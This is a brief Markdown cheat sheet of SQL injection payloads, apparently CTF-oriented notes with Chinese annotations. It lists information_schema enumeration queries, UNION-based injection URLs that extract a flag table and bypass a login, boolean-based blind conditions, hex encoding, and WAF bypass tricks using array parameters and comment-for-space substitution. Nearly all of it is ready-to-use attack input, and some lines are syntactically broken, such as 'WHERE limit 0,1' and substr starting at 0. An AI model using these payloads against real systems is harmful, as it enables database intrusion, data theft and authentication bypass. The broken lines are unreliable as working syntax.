# Web Cheat Sheet
###### tags: `Cheet Sheet`
[TOC]
## SQL injection (MySQL)
### Get Database name
- SELECT schema_name FROM information_schema.schemata;
- SELECT distinct(table_schema) FROM information_schema.tables;
- SELECT distinct(table_schema) FROM information_schema.columns;
- SELECT name FROM information_schema.innodb_tables;
- SELECT name FROM information_schema.innodb_tablestats;
### Get Table name
- SELECT table_name FROM information_schema.tables;
- SELECT table_name FROM mysql.innodb_table_stats;
- SELECT table_id,name FROM information_schema.innodb_columns;
- SELECT name FROM information_schema.innodb_tables;
- SELECT name FROM information_schema.innodb_tablestats;
### Get Current Database's Tables
- SELECT table_name FROM information_schema.tables WHERE table_schema = database();
### Get Column name
- SELECT column_name FROM information_schema.columns WHERE table_schema="{DATABASE_NAME}" AND table_name="{TABLE_NAME}";
- SELECT column_name FROM information_schema.key_column_usage WHERE table_schema="{DATABASE_NAME}" AND table_name="{TABLE_NAME}";
- SELECT column_name FROM information_schema.statistics WHERE table_schema="{DATABASE_NAME}" AND table_name="{TABLE_NAME}";
### Union Base
- 有無 syntax error，確認 column 數
    - http://example.com/index.php?id=1 Union Select 1 #
    - http://example.com/index.php?id=1 Union Select 1,2 #
    - http://example.com/index.php?id=1 Union Select 1,2,3 #
- 找 database name，可替換任意 Get Database 語法
    - http://example.com/index.php?id=1 Union Select 1, 2, database() #
    - http://example.com/index.php?id=1 Union Select 1, 2, (SELECT table_name FROM information_schema.tables limit 0,1) #
- 回傳自訂 select 結果
    - http://example.com/login.php?username=admin&password=1111' union select 'admin', 'admin' #
- Union 結合 limit 偏移取 data
    - http://example.com/index.php?id=1 Union Select 1,2,(SELECT flag from flag limit 0,1) #
    - - http://example.com/index.php?id=1 Union Select 1,2,(SELECT flag from flag limit 1,1) #
### Boolean Base
- 判斷長度
    - `' and (length((SELECT username FROM users limit 0,1)))>10`
- 判斷字元
    - `' and (ascii(substr((SELECT username FROM users WHERE limit 0,1),0,1)))>97` (MySQL)
    - `' and (unicode(substr((SELECT username FROM users WHERE limit 0,1),0,1)))>97` (SQLite)
### Replacement
- 字串比對可以轉 16 進位
    - `SELECT * FROM users WHERE username="test"` =  `SELECT * FROM users WHERE username=0x74657374`
### By pass WAF
- request 參數傳陣列(ex: username[]='123)
    - `select username from users where username = ''123'`
- By pass space(`/**/`)
    - `\'/**/or/**/2=2/**/limit/**/1,1/**/#`